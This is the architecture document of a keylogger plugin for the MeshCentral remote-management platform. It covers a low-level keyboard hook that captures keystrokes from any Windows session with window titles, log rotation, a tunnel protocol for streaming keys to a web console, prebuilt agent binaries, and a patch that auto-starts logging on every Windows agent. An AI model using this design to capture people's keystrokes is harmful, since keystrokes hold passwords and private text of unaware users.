# Architecture

## Components

```
meshcentral-keylogger/
├── agent/
│   ├── ILibDuktape_Keylogger.h     # C module header
│   └── ILibDuktape_Keylogger.c     # native keylogger (singleton, no per-instance state)
├── modules_meshcore/
│   └── win-keylogger.js            # agent tunnel module (protocol 17)
├── plugin/
│   └── mckeylog-viewmode.js        # browser controller for the Keylogs tab
├── scripts/
│   ├── patch_meshcentral.js        # idempotent MeshCentral server patch
│   └── patch_meshagent.js          # idempotent MeshAgent source patch
├── binaries/
│   ├── MeshService.exe             # x86 agent with the keylogger compiled in
│   └── MeshService64.exe           # x64 agent with the keylogger compiled in
├── mckeylog.js                     # plugin entry point (MeshCentral plugin API)
├── config.json                     # plugin manifest (Plugins page install URL)
├── install-keylogger.ps1           # server installer one-liner
├── install-keylogger-agent.ps1     # agent binary installer one-liner
└── docs/architecture.md
```

## Data flow

```
Keyboard (any session)
   │  WH_KEYBOARD_LL (dedicated thread, PeekMessage loop)
   ▼
ILibDuktape_Keylogger.c
   ├── ring buffer (4096 lines × 384 chars)
   └── keylog-YYYY-MM-DD.log  (rolling, -1/-2 rotation at 10 MB)
        ▲ require('keylogger')
        │
agents/meshcore.js  ── protocol 17 tunnel ──  meshrelay.js (rights check)
   │  win-keylogger.js: tail / start / stop / state / list / read / unsub
   ▼
MeshCentral server (authenticated relay, plain JSON over websocket)
   ▼
public/scripts/mckeylog-viewmode.js  (CreateAgentRedirect, protocol 17)
   ▼
views/*.handlebars  page 61 (MainDevKeylogs)
```

## Native module design

- **Singleton** (`g_kl`): the WASAPI module in MeshCentral Audio carries
  per-instance `this` pointers through Duktape and can be corrupted by engine
  restarts. The keylogger is a process-wide singleton — logging continues
  across JS engine restarts, and no finalizer is needed.
- **Hook thread**: `SetWindowsHookExW(WH_KEYBOARD_LL, ...)` on a dedicated
  thread with a `PeekMessageW` loop; the thread parks in
  `WaitForSingleObject(stopEvent, 50)` so stop is fast and the hook stays
  responsive (LL hooks time out at ~300 ms).
- **Character resolution**: `ToUnicodeEx` with a synthesized key state from
  `GetAsyncKeyState`/`GetKeyState` (shift/ctrl/alt/win + caps/num/scroll lock),
  so the correct character comes out regardless of which thread queries it.
- **Window titles**: `GetForegroundWindow()` is session-specific — a service
  (session 0) agent sees `NULL`. The fallback enumerates top-level windows,
  skips session-0/tool/no-activate/untitled windows, and takes the top-most
  visible, titled window of an interactive session.
- **Files**: date-named, appended, flushed per line. Rotation: current → `-1`
  → `-2` (oldest dropped). File names are validated strictly
  (`keylog-YYYY-MM-DD[-N].log`) before any path use.
- **Non-Windows**: functional stub so `require('keylogger')` behaves the same
  on Linux/macOS builds (`getState().available` semantics, empty lists).

## JavaScript API (require('keylogger'))

| Call | Result |
| --- | --- |
| `start({logDir?, maxFileSizeKB?, windowTitles?})` | start/restart logging |
| `stop()` | stop the hook thread |
| `getState()` | `{ available, running, totalKeys, bufferLines, bufferSize, dir, currentFile, maxFileSize, lastError }` |
| `read(maxLines=0)` | drain up to N pending ring lines (0 = all), oldest first |
| `listFiles()` | `[{ name, size, mtime }]` newest first |
| `readFile(name, offset, maxBytes)` | `{ data (base64), size, bytes, offset, done }` |

## Tunnel protocol (17)

Agent → browser messages: `state`, `files`, `keys { lines: [...] }`,
`filechunk { file, offset, size, bytes, data, done }`, `error`.
Browser → agent commands: `tail`, `unsub`, `start {opts}`, `stop`, `state`,
`list`, `read { file, offset, max }`.

- The agent drains **all** pending ring lines per 250 ms tick (agent timers can
  coalesce) and applies backpressure via `ws.write === false` + `drain`.
- File reads are sequential 64 KB chunks (1 MB max), base64-encoded.
- The relay rights check requires the same desktop rights as audio (15):
  admin, or remote-control/view without the no-desktop flag.

## Server patch points (all idempotent)

1. `meshrelay.js` — `isProtocolAllowedByRights`: allow protocol 17 only with
   desktop rights (mirrors protocol 15).
2. `agents/meshcore.js`
   - tunnel dispatch: `else if (this.httprequest.protocol == 17)` branch
     (rights check, `descriptorMetadata = "Remote Keylogs"`,
     `require("win-keylogger").handleTunnelData(this, data)`).
   - `onTunnelClosed`: stop the forward timer.
   - auto-start: `if (process.platform == 'win32') require('keylogger').start({})`
     after `var promise = require('promise');`.
3. `views/default.handlebars` + `views/default3.handlebars`
   - script include for `mckeylog-viewmode.js`;
   - top bar `Keylogs` tab (go(61));
   - panel map entry `61: 'MainDevKeylogs'`; loop `i < 62`;
   - submenu/tab-group/shift-click/URL ranges extended to include 61;
   - `p61` page markup;
   - device name into the page title;
   - `go()` lifecycle: `keylogsTabEnter()` / `keylogsTabExit()`.

## Agent patch points

- `microscript/ILibDuktape_Keylogger.{c,h}` copied in.
- `microscript/ILibDuktape_ScriptContainer.c`: include + `ILibDuktape_Keylogger_Init(ctx)`
  (both under `#ifdef WIN32`).
- All `meshservice`/`meshconsole` vcxproj files: ClCompile + ClInclude items.
- `makefile`: source appended for non-Visual-Studio builds.
